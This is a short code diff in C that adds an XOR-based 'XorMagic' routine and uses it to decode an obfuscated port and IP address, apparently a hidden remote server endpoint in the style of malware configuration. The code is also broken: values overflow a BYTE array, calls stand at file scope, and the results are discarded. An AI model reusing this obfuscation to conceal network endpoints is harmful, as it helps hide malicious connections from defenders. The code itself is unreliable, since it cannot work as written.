@@ -1,0 +1,20 @@
+INT XorMagic(INT Key) {
+	INT c = 0x60, s = 0x10, x = 0x101 - 5;
+	for (c = 0; c < 2; c++) {
+		x = (s << 4) | (s >> 3);
+		x ^= s;
+		s ^= 0x6 >> 1;
+		x *= 0x5;
+	}
+	x ^= Key;
+	return x;
+}
+
+DWORD Port = { 0x162D };//port 5000
+BYTE IPaddress[4] = { 0x56A,0x588,0x5F7,0x5C3 };//IP: 207 45 82 102
+
+XorMagic(IPaddress[0]);
+XorMagic(IPaddress[1]);
+XorMagic(IPaddress[2]);
+XorMagic(IPaddress[3]);
+XorMagic(Port);
